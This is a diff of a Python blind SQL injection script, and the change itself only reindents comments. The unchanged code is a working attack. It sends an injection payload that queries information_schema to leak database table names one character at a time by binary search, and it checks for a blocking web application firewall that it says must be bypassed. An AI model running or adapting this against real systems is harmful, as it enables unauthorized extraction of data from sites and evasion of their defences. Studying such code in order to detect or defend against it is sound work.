@@ -54,15 +54,15 @@ try:
 			##GUESSING ALGORITHM
 			print(f"Testing: {''.join(new_query)+charac}") #For Visualization and Debugging
         
-            #Case 1: WAF Triggered, in which case we stop the code
+            		#Case 1: WAF Triggered, in which case we stop the code
 			if "Not Acceptable" in str(resp.content) : #Status code is 406: Not Acceptable
 				print("WAF in the house") #WAF Detected, a bypass must be figured out
 				exit() #Stop running the code because WAF will block all requests if it's not bypassed
             
-            #Case 2: WAF Bypassed and the guess is Incorrect, in which case we start running the bruteforce algorithm
+		    	#Case 2: WAF Bypassed and the guess is Incorrect, in which case we start running the bruteforce algorithm
 			elif resp.status_code==200 and "Example" not in str(resp.content):
 				
-                #Extract all databases 
+				#Extract all databases 
 				resp = requests.get(f"{url}?id=1+and+substring((Select export_set(5,@x:=0,(select count(*)from(/*!information_schema*/.tables)where(table_schema like '{database_name}')and@x:=export_set(5,@x,table_name,0x2c,2)),@x,2)),{position},1)>'{charac}';", headers = Headers)
 
 				if "Example" not in str(resp.content):
@@ -72,12 +72,12 @@ try:
 				search_range = search_range[len(search_range)//2:]
 				continue
 
-            #Case 2: WAF Bypassed and the guess is Correct, in which case we note the character revealed
+			#Case 2: WAF Bypassed and the guess is Correct, in which case we note the character revealed
 			elif resp.status_code==200 and "Example" in str(resp.content):
 				new_query.append(charac) #Append the character guessed to the list of data collected
 				break #Start guessing the next character
 
-            #Case 3: Unknown response (We never know what might happen XD)
+			#Case 3: Unknown response (We never know what might happen XD)
 			else:
 				print("Unexpected Error Occurred!")
 			##END GUESSING ALGORITHM
